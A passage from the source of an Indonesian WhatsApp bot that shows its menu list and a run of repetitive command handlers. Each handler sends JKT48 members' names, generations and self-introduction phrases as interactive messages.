​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​

 ◦ ᴀʟʟᴍᴇɴᴜ [ ꜱᴇʟᴜʀᴜʜ ꜰɪᴛᴜʀ ]
 ◦ ᴏᴡɴᴇʀᴍᴇɴᴜ
 ◦ ᴍᴇɴᴜɢᴀᴍᴇ/ɢᴀᴍᴇᴍᴇɴᴜ
 ◦ ᴅᴇᴘᴏᴍᴇɴᴜ
 ◦ ᴊᴋᴛ48ᴍᴇɴᴜ
 ◦ ɢʀᴏᴜᴘᴍᴇɴᴜ
 ◦ ʀᴀɴᴅᴏᴍᴛᴛᴍᴇɴᴜ
 ◦ ʀᴀɴᴅᴏᴍғᴛᴍᴇɴᴜ
 ◦ ғᴜɴᴍᴇɴᴜ
 ◦ ᴀɴᴛɪᴍᴇɴᴜ
 ◦ ᴀᴛᴛᴀᴄᴋᴍᴇɴᴜ
 ◦ ᴀɴɪᴍᴇᴍᴇɴᴜ
 ◦ ᴠᴏɪᴄᴇᴍᴇɴᴜ
 ◦ sᴛɪᴄᴋᴇʀᴍᴇɴᴜ
 ◦ sᴇᴀʀᴄʜᴍᴇɴᴜ
 ◦ ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
 ◦ ɪsʟᴀᴍɪᴍᴇɴᴜ
 ◦ ᴀᴅᴅᴍᴇɴᴜ
 ◦ ʙᴏᴋᴇᴘᴍᴇɴᴜ
 ◦ ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ
 ◦ sᴏᴜɴᴅᴍᴇɴᴜ
 ◦ ᴛᴇxᴛᴍᴇɴᴜ
 ◦ ᴄᴇʀᴘᴇɴᴍᴇɴᴜ
 ◦ sɪᴀᴘᴀᴋᴀʜᴍᴇɴᴜ
 ◦ ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ
 ◦ ᴄᴏɴᴠᴇʀᴛ-ᴍᴇɴᴜ
 ◦ ᴘᴜsʜᴍᴇɴᴜ
 ◦ ᴀɪᴍᴇɴᴜ
 ◦ ʙᴇʀɪᴛᴀᴍᴇɴᴜ
 ◦ ᴀɴᴏɴʏᴍᴏᴜsᴍᴇɴᴜ
  
 
 ɪᴛᴜ ᴀᴅᴀʟᴀʜ ʟɪsᴛ ᴍᴇɴᴜ ꜰɪɴꜱɪɪ-ᴀɪ, ᴛᴏʟᴏɴɢ ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʏᴀ ᴋᴀᴋ ʙᴇʀɪ ᴊᴇᴅᴀ 5 ᴅᴇᴛɪᴋ ᴀɢᴀʀ ʙᴏᴛ ᴛɪᴅᴀᴋ ᴛᴇʀʙᴀɴɴᴇᴅ
 `
KhaerulZx.sendMessage(m?.chat, {
text: menuu,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `Finsii - AI`,
body: 'Welcome To Finsii Bot WhatsAp',
thumbnailUrl: 'https://i.top4top.io/p_3207vibgn1.jpg',
sourceUrl: 'https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV',
mediaType: 1,
renderLargerThumbnail: true
}
}
}
)
await KhaerulZx.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/sepuh.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case 'jiko-oshi': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `\nʙᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʟɪsᴛ ᴍᴇɴᴜ ᴊɪᴋᴏ-ᴏsʜɪ ʏᴀɴɢ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ${botname}\n
        ◦ jiko-freya
        ◦ jiko-kimmy
        ◦ jiko-jeane
        ◦ jiko-greesell
        ◦ jiko-grace
        ◦ jiko-gendis
        ◦ jiko-desy
        ◦ jiko-dena
        ◦ jiko-cynthia
        ◦ jiko-chelsea
        ◦ jiko-celline
        ◦ jiko-cathleen
        ◦ jiko-aulia
        ◦ jiko-anindya
        ◦ jiko-alya
        ◦ jiko-michie
        ◦ jiko-indira
        ◦ jiko-adel
        ◦ jiko-christy`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/KhaerulZx.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
/*case "jiko-oshii": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
nano_sad = `sᴇʟᴀᴍᴀᴛ ${salam} ᴋᴀᴋ @${m?.sender.split('@')[0]} sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ 👇 `
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: nano_sad
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/KhaerulZx.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
             {
                
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "JIKO-OSHI",
  "sections": [
    {
    "title": "${botname}",
      "rows": [
        {
          "header": "JIKO-OSHI KIMMY",
          "title": "GEN 12",
          "description": "Menampilkan JIKO-OSHI KIMMY",
          "id": ".jiko-kimmy"
        },
        {
          "header": "JIKO-OSHI JEANE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI JEANE",
          "id": ".jiko-jeane"
        },
        {
          "header": "JIKO-OSHI GREESELL",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GREESELL",
          "id": ".jiko-greesell"
        },
        {
          "header": "JIKO-OSHI GRACE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GRACE",
          "id": ".jiko-grace"
        },
        {
          "header": "JIKO-OSHI GENDIS",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI GENDIS",
          "id": ".jiko-gendis"
        },
        {
          "header": "JIKO-OSHI DESY",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI DESY",
          "id": ".jiko-desy"
        },
        {
          "header": "JIKO-OSHI DENA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI DENA",
          "id": ".jiko-dena"
        },
        {
          "header": "JIKO-OSHI CYNTHIA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CYNTHIA",
          "id": ".jiko-cynthia"
        },
        {
          "header": "JIKO-OSHI CHELSEA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CHELSEA",
          "id": ".jiko-chelsea"
        },
        {
          "header": "JIKO-OSHI CELLINE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CELLINE",
          "id": ".jiko-celline"
        },
        {
          "header": "JIKO-OSHI CATHLEEN",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI CATHLEEN",
          "id": ".jiko-cathleen"
        },
        {
          "header": "JIKO-OSHI AULIA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI AULIA",
          "id": ".jiko-aulia"
        },
        {
          "header": "JIKO-OSHI ANINDYA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI ANINDYA",
          "id": ".jiko-anindya"
        },
        {
          "header": "JIKO-OSHI ALYA",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI ALYA",
          "id": ".jiko-alya"
        },
        {
         "header": "JIKO-OSHI MICHIE",
          "title": "GEN 11",
          "description": "Menampilkan JIKO-OSHI MICHIE",
          "id": ".jiko-michie"
        },
        {
         "header": "JIKO-OSHI INDIRA",
          "title": "GEN 10",
          "description": "Menampilkan JIKO-OSHI INDIRA",
          "id": ".jiko-indira"
        },
        {
         "header": "JIKO-OSHI ADEL",
          "title": "GEN 8",
          "description": "Menampilkan JIKO-OSHI ADEL",
          "id": ".jiko-adel"
       },
       {
        "header": "JIKO-OSHI CHRISTY",
          "title": "GEN 7",
          "description": "Menampilkan JIKO-OSHI CHRISTY",
          "id": ".jiko-christy"
       },
       {
        "header": "JIKO-OSHI FREYA",
          "title": "GEN 7",
          "description": "Menampilkan JIKO-OSHI FREYA",
          "id": ".jiko-freya"
        }
      ]
    }
  ]
}`


              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363247886007681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
           break*/
case 'jiko-adel': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`REVA FIDELA ADEL PANTJORO\`*
> *GENERATION* : 8
> *JIKO* : BAGAI KUCING YANG KALEM, TAPI SELALU MEMIKAT HATI KAMU, HAI AKU ADEL!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/adel.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-michie': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`MICHELLE ALEXANDRA\`*
> *GENERATION* : 11
> *JIKO* : ALWAYS YOUR NUMBER ONE TILL INFINITY AND BEYOND, HELLO EVERYONE IT'S MICHIE!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/michie.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-indira': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`INDIRA PUTRI SERUNI\`*
> *GENERATION* : 10
> *OLD JIKO* : WATASHI NO KOKORO UNLOCK, AKAN MENEMANI HARI-HARIMU DENGAN SEPENUH HATI
> *NEW JIKO* : SENYUMANKU MENATAP LURUS KEPADAMU, SMILE EYES INDIRAA!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/indira.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-freya': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`FREYA JAYAWARDANA\`*
> *GENERATION* : 7
> *JIKO* : GADIS KOLERIS YANG SUKA BERIMAJINASI, TERANGI HARIMU DENGAN SENYUM KARAMELKU. HALO, AKU FREYA`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/freya.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-anindya': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`ANINDYA RAMADHANI\`*
> *GENERATION* : 11
> *JIKO* : SI MUNGIL HADIR, SEMANIS MANGGA`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/anin.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-aulia': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`AULIAA ASYIRA\`*
> *GENERATION* : 7
> *JIKO* : OTSU! SENYUM YANG LEBAR DAN MANIS, AULIA! SELALU INGET AKU, YA!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/aulia.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-kimmy': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
       > *NAME* : *\`VICTORIA KIMBERLY\`*
       > *GENERATION* : 12
       > *JIKO* : BAGAI HAMSTER YANG LINCAH, AKU AKAN BERLARI-LARI DIPIKIRANMU, HALO HAA KATAKAN KIMMY!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/kimmy.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-greesell': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`GREESELLA ADHALIA\`*
> *GENERATION* : 11
> *JIKO* : PANDANGAN MATAKU AKAN MENYINARI HATIMU BAGAIKAN KUNAN-KUNANG DI MALAM HARI`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/greesell.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-grace': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`GRACE OCTAVIANI\`*
> *GENERATION* : 11
> *JIKO* : MANIS SEPERTI GULALI, IMUT SEPERTI KELINCI`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/grace.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-jeane': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`JEANE VICTORIA\`*
> *GENERATION* : 11
> *JIKO* : VICTORIA! AKU AKAN SELALU MEMENANGKAN HATIMU`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/jeane.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-gendis': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`GENDIS MAYRANNISA\`*
> *GENERATION* : 11
> *JIKO* : BONJOUR, PERIANG DAN PENCAIR SUASANA ITULAH AKU!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/gendis.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-desy': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`DESY NATALIA\`*
> *GENERATION* : 11
> *JIKO* : SEPERTI BUNGA DAISY, AKU AKAN MEMANCARKAN KESEGARAN DAN KEBAHAGIAAN`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/desy.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
